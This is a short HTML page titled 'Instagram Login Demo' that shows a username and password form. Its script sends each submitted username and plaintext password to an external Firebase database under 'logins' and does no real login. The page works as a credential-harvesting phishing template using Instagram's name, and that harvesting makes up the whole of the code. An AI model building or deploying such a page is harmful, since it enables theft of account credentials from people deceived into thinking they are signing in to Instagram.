<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Instagram Login Demo</title>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
</head>
<body>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>

  <script>
    // Firebase Config (replace with your own config from Firebase Console)
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "instagram-login.firebaseapp.com",
      databaseURL: "https://instagram-login-9301b-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "instagram-login",
      storageBucket: "instagram-login.appspot.com",
      messagingSenderId: "123456789",
      appId: "1:123456789:web:abcdef"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Form submit → save data
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;

      db.ref("logins").push({
        username: user,
        password: pass
      });

      alert("Data saved to Firebase!");
    });
  </script>
</body>
</html>
